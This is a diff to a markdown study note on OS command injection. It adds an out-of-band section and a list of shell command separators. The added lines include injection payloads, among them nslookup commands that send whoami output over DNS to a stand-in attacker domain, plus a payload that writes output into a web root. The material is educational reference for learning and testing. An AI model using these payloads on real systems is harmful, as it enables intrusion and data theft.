@@ -7,6 +7,8 @@ OS command injection is also known as shell injection. It allows an attacker to 
 - [OS injection](#os-command-injection)
 - [Bind OS injection](#blind-command-injection)
     - [Dectect blind injection using time delays](#dectect-blind-injection-using-time-delays)
+    - [Redirect output](#redirecting-output)
+    - [Exploiting blind OS command injection using out-of-band (OAST) techniques](#exploiting-blind-os-command-injection-using-out-of-band-oast-techniques)
 - [Usefull command to execute](#usefull-command-to-execute)
 
 ## Os command injection
@@ -41,7 +43,29 @@ You can redirect the output from the injected command into a file within the web
 & whoami > /var/www/static/whoami.txt &
 ```
 
+### Exploiting blind OS command injection using out-of-band (OAST) techniques
+
+You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques.
+
+```bash
+& nslookup kgji2ohoyw.web-attacker.com &
+```
+
+This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected.
+
+The out-of-band channel provides an easy way to exfiltrate the output from injected commands:
+
+```sh
+& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+```
+
+This causes a DNS lookup to the attacker's domain containing the result of the whoami command:
+
+wwwuser.kgji2ohoyw.web-attacker.com
+
 ## Usefull command to execute
+
+### Get informations on the system:
 
 linux | windows | info
 --- | --- | ---
@@ -50,6 +74,31 @@ linux | windows | info
 `ifconfig` | `ipconfig /all` | network conf
 `netstat -an` | `netstat -an` | network connections
 `ps -ef` | `tasklist` | running process
+
+### Way of injecting OS command
+
+Command separator:
+
+```bash
+&
+&&
+|
+||
+```
+
+Only work on linux:
+
+```sh
+;
+
+#newline :
+0x0a or \n
+
+# inline exec of a injec command within the original command
+`whoami`
+$(whoami)
+```
+
 
 ### Documentation
 
